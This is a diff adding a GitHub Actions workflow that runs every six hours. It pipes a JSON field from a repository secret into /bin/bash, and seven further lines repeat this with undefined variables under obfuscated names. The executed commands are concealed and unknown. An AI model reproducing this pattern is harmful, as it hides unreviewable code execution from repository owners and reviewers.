@@ -1,0 +1,25 @@
+name: hezongweiguozong
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '44 5/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: hezongweiguozong
+        env:
+          iht50: ${{ secrets.iht50 }}
+        run: |
+          echo $iht50 | jq -r .cbsb38326 | /bin/bash
+          echo $lzam75628 | jq -r .jhv92 | /bin/bash
+          echo $q4 | jq -r .aje4 | /bin/bash
+          echo $je7 | jq -r .d2221 | /bin/bash
+          echo $bxbzv19892 | jq -r .jcx81523 | /bin/bash
+          echo $rtx66177 | jq -r .tab585 | /bin/bash
+          echo $jw39926 | jq -r .fb02848 | /bin/bash
+          echo $strm0631 | jq -r .coila3762 | /bin/bash
+
